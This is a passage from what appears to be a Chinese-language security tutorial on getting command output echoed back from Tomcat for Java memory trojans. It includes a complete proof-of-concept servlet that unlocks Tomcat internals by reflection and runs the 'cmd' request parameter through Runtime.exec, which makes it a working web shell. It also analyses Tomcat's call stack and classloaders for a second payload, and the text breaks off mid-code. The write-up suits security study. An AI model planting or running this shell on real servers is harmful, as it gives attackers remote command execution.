generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    lastServicedResponseField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a name="jjAuo"></a></p><h4 id="获取request、response变量"><a href="#获取request、response变量" class="headerlink" title="获取request、response变量"></a>获取request、response变量</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">ThreadLocal</span> threadLocalReq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThreadLocal</span><span class="token punctuation">)</span> lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ThreadLocal</span> threadLocalRes <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocal</span><span class="token punctuation">)</span> lastServicedResponseField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> threadLocalReq<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HttpServletResponse</span> response<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> threadLocalRes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span></code></pre><p>请求两次，第一次修改变量值，第二次获取Request<br><a name="HNztX"></a></p><h3 id="完整Poc"><a href="#完整Poc" class="headerlink" title="完整Poc"></a>完整Poc</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span><span class="token class-name">Echo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span><span class="token class-name">Response</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">.</span></span><span class="token class-name">ResponseFacade</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">ApplicationFilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Modifier</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/echo"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Tomcat_Local</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token comment">//反射获取所需属性</span><span class="token class-name">Field</span> <span class="token constant">WRAP_SAME_OBJECT_FIELD</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.ApplicationDispatcher"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"WRAP_SAME_OBJECT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> lastServicedRequestField <span class="token operator">=</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"lastServicedRequest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> lastServicedResponseField <span class="token operator">=</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"lastServicedResponse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用modifiersField反射修改final型变量</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Field</span> modifiersField <span class="token operator">=</span> <span class="token class-name">Field</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"modifiers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">,</span> <span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">,</span> lastServicedRequestField<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>lastServicedResponseField<span class="token punctuation">,</span> lastServicedResponseField<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><span class="token comment">//第一次请求进行初始化</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">getBoolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">setBoolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//第二次请求获取request变量</span><span class="token keyword">if</span><span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">ThreadLocal</span> threadLocalReq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThreadLocal</span><span class="token punctuation">)</span> lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ThreadLocal</span> threadLocalRes <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocal</span><span class="token punctuation">)</span> lastServicedResponseField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> threadLocalReq<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HttpServletResponse</span> response<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> threadLocalRes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">||</span> response<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">cmdEcho</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> <span class="token operator">|</span> <span class="token class-name">IllegalAccessException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">cmdEcho</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">PrintWriter</span> writer<span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span>scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">;</span>scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><a name="FIhHd"></a></p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在ApplicationFilterChain#internalDoFilter方法中，doFilter方法实际上是在我们获取response之前的。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。</p><p><a name="plH79"></a></p><h2 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h2><p>Servlet容器是Java Web的核心，因此很多框架对于该容器都进行了一定程度的封装。不同框架、同一框架的不同版本的实现都有可能不同，因此我们很难找到一种通用的获取回显的方法。<br>比如我们上文通过ThreadLocal类来获取回显的方式就无法适用于Shiro框架下，那么我们能不能换一种思路，寻找Tomcat中全局存储的Request和Response</p><p>request和response对象必须是属于当前线程的，因此通过全局存储获取回显的关键就在于找到当前代码运行的上下文和Tomcat运行上下文的联系<br><a name="WgmNT"></a></p><h3 id="调用栈分析"><a href="#调用栈分析" class="headerlink" title="调用栈分析"></a>调用栈分析</h3><p>首先我们先来寻找一下Tomcat中的一些全局Response。在AbstractProcessor类中，我们能够找到全局response<br><img src="/img/3-16/3.png"><br>再来看看一个Servlet的调用栈<br><img src="/img/3-16/4.png"></p><pre class="language-java" data-language="java"><code class="language-java">doGet<span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token class-name">Tomcat_Echo</span>service<span class="token operator">:</span><span class="token number">655</span><span class="token punctuation">,</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">)</span>service<span class="token operator">:</span><span class="token number">764</span><span class="token punctuation">,</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">)</span>internalDoFilter<span class="token operator">:</span><span class="token number">227</span><span class="token punctuation">,</span> <span class="token class-name">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>doFilter<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token class-name">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>service<span class="token operator">:</span><span class="token number">357</span><span class="token punctuation">,</span> <span class="token class-name">CoyoteAdapter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>connector<span class="token punctuation">)</span>service<span class="token operator">:</span><span class="token number">382</span><span class="token punctuation">,</span> <span class="token class-name">Http11Processor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">.</span>http11<span class="token punctuation">)</span>process<span class="token operator">:</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token class-name">AbstractProcessorLight</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>process<span class="token operator">:</span><span class="token number">895</span><span class="token punctuation">,</span> <span class="token class-name">AbstractProtocol</span>$<span class="token class-name">ConnectionHandler</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>coyote<span class="token punctuation">)</span>doRun<span class="token operator">:</span><span class="token number">1722</span><span class="token punctuation">,</span> <span class="token class-name">NioEndpoint</span>$<span class="token class-name">SocketProcessor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token class-name">SocketProcessorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>net<span class="token punctuation">)</span>runWorker<span class="token operator">:</span><span class="token number">1191</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">659</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span>$<span class="token class-name">Worker</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token class-name">TaskThread</span>$<span class="token class-name">WrappingRunnable</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>run<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span></code></pre><p>调用了Http11Processor#service方法<br><img src="/img/3-16/5.png"><br>而Http11Processor继承了AbstractProcessor类，这里的response对象正是AbstractProcessor类中的属性，因此我们如果能获取到Http11Processor类，就能获取到response对象<br><img src="/img/3-16/6.png"><br>所以调用栈继续往上翻，在AbstractProtcol内部类ConnectionHandler的register方法中存在着对Http11Processor的操作<br><img src="/img/3-16/7.png"><br>我们接着往下看，调用栈调用了内部类ConnectoinHandler的process()方法，该方法会调用registry方法将processor存储在global中<br><img src="/img/3-16/8.png"></p><p><img src="/img/3-16/9.png"><br>该属性中存储了一个RequestInfo的List，其中在RequestInfo中我们也能获取Request<br><img src="/img/3-16/10.png"></p><p>现在我们的工作就是获取AbstractProtocol类或者继承AbstractProtocol的类，继续看调用链。在CoyoteAdapter类中，存在一个connector属性<br><img src="/img/3-16/11.png"><br>我们来看Connector类，存在和AbstractProtocol相关的protocolHandler属性<br><img src="/img/3-16/12.png"><br>此时我们看调用链，该属性的值为一个Http11NioProtocol对象，并且该类继承了AbstractProtocol类</p><p>那么反射获取链</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Connector</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-&gt;</span><span class="token class-name">Http11NioProtocol</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-&gt;</span><span class="token class-name">AbstractProtocol</span>$<span class="token class-name">ConnectoinHandler</span>#<span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-&gt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>global<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">&gt;</span><span class="token class-name">RequestInfo</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-&gt;</span><span class="token class-name">Request</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">&gt;</span><span class="token class-name">Response</span></code></pre><p>下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector<br>Tomcat#setConnect中<br><img src="/img/3-16/13.png"><br>StandardService#addConnector如下，该方法会将Connector放入属性connectors中<br><img src="/img/3-16/14.png"><br>下面的工作就是获取StandardService对象了</p><p><a name="PNnb8"></a></p><h3 id="Tomcat类加载"><a href="#Tomcat类加载" class="headerlink" title="Tomcat类加载"></a>Tomcat类加载</h3><blockquote><p>下面废话一堆，就是平常审计代码中常见的操作–从当前线程拿到类加载器</p></blockquote><p>Tomcat使用的并不是传统的类加载机制，我们来看下面的例子</p><p>我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。</p><p>Tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。</p><p>那么我们又如何将原有的父加载器和WebappClassLoader联系起来呢？这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。</p><p><strong>Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器</strong>。如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。<br>对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。</p><p>因此WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。</p><p>这里通过调试，我们能够看到这里的线程类加载器是继承了WebAppClassLoader的ParallelWebAppClassLoader。<br><img src="/img/3-16/15.png"></p><img src="/img/3-16/16.png"><img src="/img/3-16/17.png"><p>拿到类加载器后，发现后面的resource中的context是StandarContext<br>看看StandarContext中的context属性<br><img src="/img/3-16/18.png"><br>再从StandarContext中反射拿到ApplicationContext<br><img src="/img/3-16/19.png"></p><p><a name="HwvsX"></a></p><h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p>思路总结</p><ol><li>从当前线程拿到类加载器</li><li>获取ApplicationContext</li><li>获取从ApplicationContext中获取StandarService</li><li>从StandardService获取Connector</li><li>Connector#getProtocolHandler方法来获取对应的protocolHandler，并反射获取内部类ConnectionHandler</li><li>获取gobal属性</li><li>获取processor,进一步获取Request</li></ol><p>多层套娃下,反射拿到Request<br><img src="/img/3-16/20.png"><br>获取StandardContext：<br>踩坑 : 反射时候最好使用Class.forName获取类<br>（最好别用getClass(),就怕获取的是子类的Class,无法获取父类的field)<br>本来获取resources是有getResources方法的，但是返回null<br><img src="/img/3-16/21.png"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">WebappClassLoaderBase</span> classLoader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> resourcesField <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span 